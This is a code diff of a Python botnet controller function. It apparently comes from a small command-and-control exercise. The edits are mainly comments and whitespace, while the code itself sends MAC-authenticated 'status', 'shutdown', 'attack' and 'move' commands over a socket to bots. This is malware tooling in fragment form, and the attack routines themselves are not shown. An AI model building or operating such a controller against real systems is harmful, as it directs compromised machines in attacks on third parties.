@@ -149,9 +149,8 @@ def bot_controller(args: str, sock: socket):
     host = split_hostPort[0]
     port = int(split_hostPort[1])
     secret = args.secret
-    #print("secret: ", secret)
-
     command = input('cmd> ')
+
     while (1):
         # Flush data that was sent from bots
         # If a bot is created after the controller is turned on then will recieve extra input
@@ -164,7 +163,7 @@ def bot_controller(args: str, sock: socket):
             print("recieved new data from bots: ")
             print(response)
 
-        # Sending stauts command to bot
+        # Sending status command to bot
         if command == "status":
             # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
@@ -189,7 +188,8 @@ def bot_controller(args: str, sock: socket):
             
             # Receive the bot reply
             recieve_shutdown_data(sock)
-
+        
+        # Sending attack command to bot
         elif command[0:6] == "attack":
             # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
@@ -202,10 +202,13 @@ def bot_controller(args: str, sock: socket):
             # Receive the bot reply
             recieve_attack_data(sock)
 
+        # Sending move command to bot
         elif command[0:4] == "move":
+            # Calculate a nonce and MAC for this command
             nonce = calc_nonce()
             mac = str(hashlib.sha256((nonce + secret).encode('utf-8')).hexdigest())
 
+            # Send the command
             nonce_mac_cmd = nonce + " " + mac[0:8] + " " + command      #[0:8] is for only taking the first 8 characters of the mac
             sock.send(nonce_mac_cmd.encode())
             
